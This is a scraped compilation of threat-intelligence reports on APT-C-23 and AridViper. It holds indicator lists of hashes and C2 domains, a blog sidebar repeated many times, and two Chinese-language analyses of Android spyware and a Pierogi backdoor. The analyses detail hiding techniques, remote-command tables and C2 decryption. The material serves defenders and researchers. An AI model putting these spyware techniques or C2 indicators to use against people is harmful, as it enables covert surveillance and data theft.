adaa228e7b90ea2649da319f6651b140e93273d016267240c9aea7c0fea2e0bc
c4fdbfd6608748d7f675a83f392cd923e86a6d491395a611a3d651c3385708b8
ebe09a6ef73a572f7a19d2e1eccd8f5d1895ae2730e67a060d008a2703ab3ec2
adaa228e7b90ea2649da319f6651b140e93273d016267240c9aea7c0fea2e0bc
C2 wanda-bell[.]website jarah-zeiman[.]website
VolatileVenom
Hashes
522973e9d2944ca14072e1943136aeecf85d2e5adba26223635505c83ec865ab
0f8395b1768314e3f4a0332fb2bad642308b96513c9db72884926cc736a57991
c8d51db4b2171f289de67e412193d78ade58ec7a7de7aa90680c34349faeeee2
69ec780e60073c25ef23c1983c43ca79c957ec6ae9d6df8967b4822bad8c700e
feef85f0a8f65b75776fc694e255bfa1b0240ebc1eb6af7dfb070064a31e61fc
b2396341f77b9549f62a0ce8cc7dacf5aa250242ed30ed5051356d819b60abff
7d3a00c93cbf15df1afab245f9be47feb27c862d51581dadaec50378bee7d5fa
54f2aa690954ddfcd72e0915147378dd9a7228954b05c54da3605611b2d5a55e
144ba7c6090acbd2bc35411a815ccf801fd49abc5dde327b03f207ed868cdd6e
2481f133dd3594cbf18859b72faa391a4b34fd5b4261b26383242c756489bf07
2d6f114e595c861799a91c840a42d065aeba4e85aefccd7fe806d4f10416f1d6
C2 Domains
frances-thomas[.]com
scott-chapin[.]com
linda-gaytan[.]website
david-gardiner[.]website
amanda-hart[.]website
javan-demsky.website
Google URLs
https://sites.google.com/view/janx/about
https://sites.google [.]com/view/linda-lester/lockhart
https://sites.google [.]com/view/charlok/adlov
https://sites.google [.]com/view/kevin-arocha/transform-status
https://sites.google [.]com/view/sebastian-victor/jonathan
https://sites.google [.]com/view/virginia-blake/samantha
https://sites.google [.]com/view/esther-wright/process
The Cybereason Nocturnus Team has brought the world’s brightest minds from the military, government intelligence, and enterprise security to uncover emerging threats across the globe. They specialize in analyzing new attack methodologies, reverse-engineering malware, and exposing unknown system vulnerabilities. The Cybereason Nocturnus Team was the first to release a vaccination for the 2017 NotPetya and Bad Rabbit cyberattacks.
All Posts by Cybereason Nocturnus
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Operation Bearded Barbie: APT-C-23 Campaign Targeting Israeli Officials
This APT-C-23 campaign involves of two previously undocumented malware strains dubbed Barb(ie) Downloader and BarbWire Backdoor, which use an enhanced stealth mechanism to remain undetected - in addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom...
April 6, 2022 /
Evaluating XDR Solutions? Caveat Emptor - Buyer Beware
Don’t be fooled by marketing ploys from vendors touting their latest big dollar acquisition of technologies they can’t integrate but still try to pawn off as XDR...
April 6, 2022 /
Malicious Life Podcast: Chris Roberts - Hackers on a Plane
When Chris Roberts landed at Syracuse, two FBI agents escorted him off the airplane. Apparently, this wasn't the first time that the Gray Hat hacker was suspected of hacking into an aircraft's control system while in flight - check it out...
April 5, 2022 /
Category
Ransomware vs AI: The Battle Between Machines
An AI-driven XDR solution can cut through the noise introduced by a constant flood of alerts, allowing security teams to spend less time sifting through alerts and chasing false positives and more time detecting and blocking attacks...
Category
Cybereason and IBM: A Better Way to do Enterprise IR
Cybereason and IBM are launching a joint solution to address the most critical SOC challenges and significantly improve incident response delivery, triage, and remediation processes...
NEWSLETTER
Never miss a blog
Get the latest research, expert insights, and security industry news.
Subscribe近些年来，移动互联网飞速发展，在移动APP为人们生活提供了大量的便利，同时也给了一些非法组织从事违法犯罪活动提供了渠道，今天我们介绍的是臭名昭著的APT-C-23（双尾蝎APT组织），这个组织以阿拉伯语为主，代表哈马斯、伊斯兰原教旨主义运动，是一个针对中东地区相关国家的教育机构、军事机构等重要领域窃取敏感信息为主的网络攻击组织。随着技术的迭代更新，恶意程序具有更高的隐蔽性，攻击平台主要包括 Windows 与 Android。近几年国内外安全团队都有对此组织的活动的曝光。 概述 近期，暗影实验室的态势感知平台捕获了几款此类的间谍软件,此类恶意程序仿冒成正常的交友聊天类软件，诱导用户下载安装并同意权限和无障碍通知，在注册使用时会根据安卓版本选择隐藏或更改应用图标，隐藏活动入口，防止用户主动杀后台，后台运行通过FCM（Firebase Cloud Messaging）消息传递和SMS短信并远程操控手机执行监听并上传用户隐私信息，会通过进行远控指令的下发。 其主要间谍功能为：
• 获取用户手机通讯录
• 获取用户短信
• 获取指定格式的文件
• 获取图片
• 获取通话记录
• 获取安装应用列表
• 获取拦截聊天应用的通知消息通知
• 录音和通话录音
• 设置无线网络
• 调用系统相机拍照
样本信息 恶意程序基本信息如下表：
应用名称 样本md5 包名
Whispers 4139BC61833F61365F49DC165AAB0AE5 com.whispers.chat
Whispers C76402446B83840DD2D3635522874F8C com.whispers.chat
恶意程序安装图标如下图： 恶意程序签名信息如下表：
所有者 EMAILADDRESS= lorenz@londatiga.net , CN=Lorensius W. L. T, OU=AndroidDev, O=Londatiga, L=Bandung, ST=Jawa Barat, C=ID
发布者 EMAILADDRESS= lorenz@londatiga.net , CN=Lorensius W. L. T, OU=AndroidDev, O=Londatiga, L=Bandung, ST=Jawa Barat, C=ID
序列号 E6EFD52A17E0DCE7
证书MD5 EEA6F6F40858B8215C48B0465FE479B8
证书SHA1 ECE521E38C5E9CBEA53503EAEF1A6DDD204583FA
证书SHA256 518AC8BDAF0C767DEB31BAE1EBA826ADBEF793A68F22784CF3E19C67BA87ECB9
程序运行流程图
图 3 程序运行流程图
核心功能 仿冒聊天应用并获取权限 该恶意应用仿冒聊天类应用，诱导用户安装，并设置“targetSdkVersion="22"，仿冒GoolePlay一次性申请所有权限隐私权限。 图 4-1 -1 仿冒聊天应用并诱骗获取权限
使用钓鱼页面诱导用户FackeBook登录获取其账号密码。
图 4-1 -1 fackebook 钓鱼页面
应用防护策略 恶意程序通过激活设备管理和后台隐藏，防止用户正常卸载和杀后台操作；通过隐藏或改变恶意程序桌面快捷方式，欺诈用户。 激活设备管理器 恶意程序，通过激活设备管理器，防止用户正常卸载。
图 4- 2-1-1 判断是否开启了设备管理器
图 4- 2-1-2 激活设备管理器
隐藏后台 恶意程序通过设置“excludeFromRecents="true"”属性，使后台运行程序对用户不可见，防止用户主动结束杀后台。
图 4- 2-2-1 隐藏后台应用
隐藏应用图标或改变应用图标 当用户进行注册此应用时，会弹出警告：提示将卸载此应用，实际是恶意软件将根据手机安卓版本选择更改图标或隐藏桌面快捷方式。
• 安卓10及以上版本，将随机更改成谷歌地图、Chrome、设置等图标。
• 安卓10以下版本，隐藏桌面快捷方式。
图 4- 2-3-1 卸载警告信息和更改快捷方式图标
判断系统版本： 图 4- 2-3-2 判断系统版
恶意程序隐藏桌面快捷方式： 图 4- 2-3-3 隐藏桌面快捷方式
通过使用“activity-alias”设置应用Activity的别名，提供快捷入口和更改应用图标。 图 4- 2-3-4 设置别名
在安卓10及以上版本，图标将被替换成谷歌地图、Chrome、设置等图标。
图 4- 2-3-5 更改图标
监听获取用户隐私 恶意程序通过Google的FCM（Firebase Cloud Messaging）和短信执行远程控制指令。 短信远控指令 注册短信监听的广播: 图 4- 3-1-1 注册短信广播
通过正则表达式匹配短信内容: 图 4- 3-1-2 正则匹配短信
解析到的短信内容指令实现远控操作： 图 4- 3-1-3 短信的远控指令下发
短信指令和远控功能如下表： 短信指令 功能
59 启动
95 停止
34 Enable Mobile Data
43 Disable Mobile Data
5 录音重置
77 获取应用列表
0 开启WIFI
99 关闭WIFi
44 获取手机通讯录
66 获取设备信息
88 获取手机文件
11 检查进程
7 修改domain
FCM远控指令 在清单文件中注册了FCM的服务： 图 4- 3-2-1 使用 FCM 框架
通过FCM消息传递解析对应参数(type)获取远控指令: 图 4- 3-2-2 解析 FCM 的通知参数
根据远程消息指令实现远控操作: 图 4- 3-1-3 FCM 的远控指令下发
FCM框架的指令的功能和作用如下表： FCM指令 功能
take_photo 获取相册
s_perms 申请权限
record_sound 录音
apps_info 应用列表
wifi_restart WIFI设置
find_mobile_number 通话信息
call_rec_encode 录音加密存储
uninstall_another 卸载程序
wxyz 截屏
wxyz_period 定时截图
call_rec_old_method 通话录音
call_rec_reset 通话录音重置
call_logs 通话记录
w_s 获取WhatsApp账户信息
access_service_check 服务器检测
check_hide 隐藏图标
mess_cont 获取短信和通讯录
s_tree 获取目录
stop_rec 停止录音
stop_custom_rec 停止录音
stop_current_rec 暂停录音
manage_files 文件管理
fast_get 下载文件
update 更新
delete_app 删除APP
online 电池
info 账号设备信息
refresh_connect c从新链接
mobile_data 设备信息
get_call 拨打电话
主要间谍功能的实现 恶意程序的主要远程功能为：获取用户通讯录、获取短信、获取通话记录、获取图片、获取指定格式的文件、获取安装应用列表、拦截获取指定聊天软件的通知消息、通话录音、录音、截屏、调用系统相机拍照、启用WIFI等。 获取用户通讯录： 图 4-4-1 获取用户通讯录
获取用户短信: 图 4-4-2 获取用户短信
获取用户通话记录: 图 4-4-3 获取用户通话记录
获取指定格式的文件：(拓展名为pdf, doc, docs, ppt, pptx, xls, xlsx, txt, text) 图 4-4-4 获取指定格式的文件
获取用户图片：（拓展名为jpg, jpeg, png） 图 4-4-5 获取用户图片
录音功能: 图 4-4-6 录音
通话录音功能: 图 4-4-7 通话录音
获取已安装的应用列表: 图 4-4-8 获取安装应用列表
获取应用通知通知消息并拦截：（facebook、whatsapp、telegram、instagram、viber、skype、imo） 图 4-4-9 获取其他聊天应用通知
截屏功能： 图 4-4-10 手机截屏
调用系统相机拍照: 图 4-4-11 使用系统相机拍照
设置WIFI状态: 图 4-4-12 设置 wifi
服务器C2特征 通过分析发现恶意上传用户隐私信息使用的HTTPS通信，恶意软件通过将地址加密硬编码存放于“liboxygen.so”文件中，并通过解密后的地址返回动态加载真正的恶意地址。 图 4-5-1 加载 so
图 4-5-2 服务器地址
分析函数找到硬编码的加密地址： 图 4-5-3 地址硬编码
通过AES和Base64进行加解密： 图 4-5-4 地址解密方法
还原解密关键代码： 图 4-5-5 还原解密代码
解密后的中间地址：https://sites.***.com/view/virginia-****/**** 图 4-5-6 中间地址解密
通过中间地址动态返回内容匹配关联的字符串： 图 4-5-7 匹配返回的字符串
匹配到的内容：
图 4-5-8 匹配到的字符串
处理匹配到的字符串获取真实的恶意地址： 图 4-5-9 解析真实的恶意地址
解析出的真实URL地址为：https://fran*****.com/version/ 图 4-5-10 真实的恶意地址
修复方法 安装此类app后，处理方式有三个步骤，用户可以通过以下方法卸载： （1）立即关闭所有网络连接（断开手机移动网络和wlan），在未删除app前，建议禁止网络连接； （2）在手机设置的应用信息中找到应用图标，点击卸载（如激活设备管理器，需要先取消激活）； （3）如果以上方法都无法删除，备份一些重要数据到电脑，然后恢复出厂设置。如果不放心，也可选择重置手机，以此规避已经投放到手机上的恶意负载的攻击。 安全建议 恒安嘉新暗影移动安全实验室在此提醒广大用户，不轻易相信陌生人，不轻易点击陌生人发送的链接，不轻易下载不安全应用，不安装非正规途径来源的APP。用户可以采用以下方式来阻止钓鱼软件攻击：
• 谨慎打开未知短信的下载链接。
• 避免点击网页中的链接或下载附件。
• 仅从受信任的来源下载应用程序，建议去正规的应用市场或官方下载。
暗影移动安全实验室（EversecLab） 是恒安嘉新移动安全能力的支撑部门，由移动安全、数据安全、人工智能、漏洞挖掘等众多领域专家组成，专注于移动安全技术创新与研究，以及移动互联网应用安全的生态建设，包括移动恶意程序分析、安全风险评估、信息安全检测、数据安全评估、黑灰产溯源挖掘、诈骗APP分析、隐私合规检测等等。自主研发第四代移动APP高速研判分析引擎，支持动态检测引擎（动态沙箱技术）、静态检测引擎、AI检测引擎，样本库积累千万级，PB级大数据存储处理技术等。可为客户提供海量应用的信息挖掘，精准、实时、高效的APP检测、情报数据收集、数据关联分析、情报线索扩展，大屏态势感知展示等等。 “安全创造价值”–暗影移动安全实验室坚持以安全为核心，研究为己任，继续创新和开发解决用户问题和行业痛点的产品，为国家的网络安全事业保驾护航。近日， 安恒信息中央研究院猎影实验室追踪到一起针对中东地区的网络间谍活动 ，经研究，此次活动与之前的攻击攻击活动存在许多相似之处，因此背后的攻击组织被归因为Gaza Cybergang Group2：AridViper。
在本次攻击活动中，Gaza Cybergang Group2（AridViper）以“法塔赫运动和巴勒斯坦事业的未来”话题为诱饵再次针对巴勒斯坦地区目标进行网络钓鱼活动攻击。在深度跟踪此次活动后我们有如下发现：
后续负载疑似为Pierogi Backdoor的C++版本，该版本中用到了开源CURL框架进行通信，以及开源的Nlohmann对C2服务器返回的json数据进行解析
Gaza Cybergang Group该组织自2012年开始活跃，是一个出于政治动机，以阿拉伯语为主的高级威胁组织。由于该组织攻击目标一致，在攻击活动中涉及到的恶意软件及感染阶段较为分散，因此Kaspersky研究人员将该组分为了三个子组：
Gaza Cybergang Group1：即Molerats，该小组自2012年一直活跃，其使用鱼叉式网络钓鱼邮件针对中东及北非地区的目标，鱼叉式网络钓鱼邮件主题常附加巴勒斯坦权力机构相关的诱饵诱使目标下载并运行恶意文件。该组织在活动中使用多种恶意软件，包括自研特马以及其他通用工具；
Gaza Cybergang Group2：也称Desert Falcons、AridViper，该小组除了针对中东及北非目标外，还发起过针对欧洲及亚洲国家的恶意活动。其自研攻击武器以Windows端恶意软件Kasperagent、Micropsia以及Android端恶意软件Vamp、GnatSpy为主；
Gaza Cybergang Group3：该小组被认为是Operation Parliament的幕后黑手，也是三个子组中攻击技术和手法最为复杂的。其专注于中东、北美、欧洲和亚洲的高知名度目标，据报道，该组织曾袭击过政府机构、议会、参议院、外交机构，甚至奥林匹克和其他体育机构。
三个子组使用不同的攻击技术，但在某些情况下，攻击者会共享初始感染阶段后的工具和命令，例如Group1部署的恶意脚本分发Group2的恶意软件。也正因如此，这些子组被统称为Gaza Cybergang。
读取C:\Users\gg\AppData\Local\Temp\MilliebyBrownTechanimationGB\SearchFilterHostbv.txt文件内容，若文件内容为空，则获取计算机名经base64编码后写入TXT文件中
校验yDVy8x字段返回值，若校验成功则进行以下操作，根据后续数据库报错信息推测yDVy8x字段可能为reques_id。
获取时间戳，在%Temp%MilliebyBrownTechanimationGB/目录下创建以时间戳为名的.mhi文件，用于存储通过模拟键盘PRINT SCREEN键捕获到的屏幕快照数据，与C2通信后删除.mhi文件。
POST .../n7RyOPKaeyTRD0cD/...，字段：K8vOE7pWbD 计算机名，HChdIuD7Gp字段经解析后为null值，为C2服务器回传字段。
校验yDVy8x字段返回值，若校验成功则进行以下操作：
接收K1BkPO字段信息，debug过程中该字段为null，根据后续上传信息猜测K1BkPO字段为C2服务器回传的shell指令在%Temp%MilliebyBrownTechanimationGB/目录下创建以随机字符命名的文件RYwTiizs2_1654843986.txt，该文件用于存放shell指令执行结果：
该POST请求将获取信息直接存放数据库中，由于未获取到C2服务器回传的request_id，因此POST数据入库失败
{"error":"SQLSTATE[HY000]: General error: 1366 Incorrect integer value: 'null' for column 'request_id' at row 1 (SQL: insert into `files` (`name`, `device_id`, `request_id`, `path`, `parts`, `updated_at`, `created_at`) values (RYwTiizs2_1654843986.txt, 426, null, public\/files\/426\/docs\/RYwTiizs2_1654843986.txt, 0, 2022-06-10 10:04:39, 2022-06-10 10:04:39))","s_code":400}
这里K1BkPO字段为null，因此执行结果为空。
校验yDVy8x字段返回值，若校验成功则进行以下操作：
接收K1BkPO、NJ4mVB字段信息，debug过程中该字段均为null， 在%Temp%MilliebyBrownTechanimationGB/目录下创建WindowLanWlanWwanSwitchingServiceUW.txt，用于接收后续负载执行。
Pierogi后门发送到C2的信息包括：cname计算机名、av反病毒软件、osversion操作系统版本、aname恶意软件在受感染机器上的位置，与此次捕获样本所上传的信息相同
不同的是，以往活动中的恶意DOC文档通过Download URL获取后续负载，此次捕获DOCM文档将恶意负载以字符串的形式内嵌在宏代码中。此外，上述后门（Pierogi Backdoor）使用Delphi编写，此次捕获样本为C++编写。
本次捕获 样本的网络流量特征与研究人员于2020年披露的AridViper攻击活动有相似之处，响应包格式均为："key" : ["The key is required."]。“巧合”的是，后门的POST包缺省字段均为反病毒软件查询字段：
此次捕获后门连接到的URL路径与Palo Alto 2020年披露的AridViper新型python后门PyMICROPSIA[2]连接的URL路径结构的风格相似，均为随机字符组成：
综上，此次活动可以归属到Gaza Cybergang组织下的子组2：AridViper。在经过大量关联对比分析，我们也证实了该组织内部子组存在恶意软件资源共享。
中东地区组织鱼龙混杂，为防范钓鱼攻击波及自身，安恒建议广大用户不要随意打开和下载未知来源的邮件附件及链接，提高对钓鱼邮件攻击的警惕。 如有需要鉴别的未知来源样本，可以投递至安恒云沙箱查看判别结果后再进行后续操作。
针对该事件中的最新IoC情报，以下产品的版本可自动完成更新，若无法自动更新则请联系技术人员手动更新： （1）AiLPHA分析平台V5.0.0及以上版本 （2）AiNTA设备V1.2.2及以上版本 （3）AXDR平台V2.0.3及以上版本 （4）APT设备V2.0.67及以上版本 （5）EDR产品V2.0.17及以上版本
[1] The Discovery of the New, Mysterious Pierogi Backdoor
[2] PyMICROPSIA: New Information-Stealing Trojan from AridViper
猎影实验室， 是一支关注APT攻防的团队，主要的研究方向包括：收集APT攻击组织&情报、APT攻击检测、APT攻击分析、APT攻击防御、APT攻击溯源以及最新APT攻击手段的研究。
不看此公众号
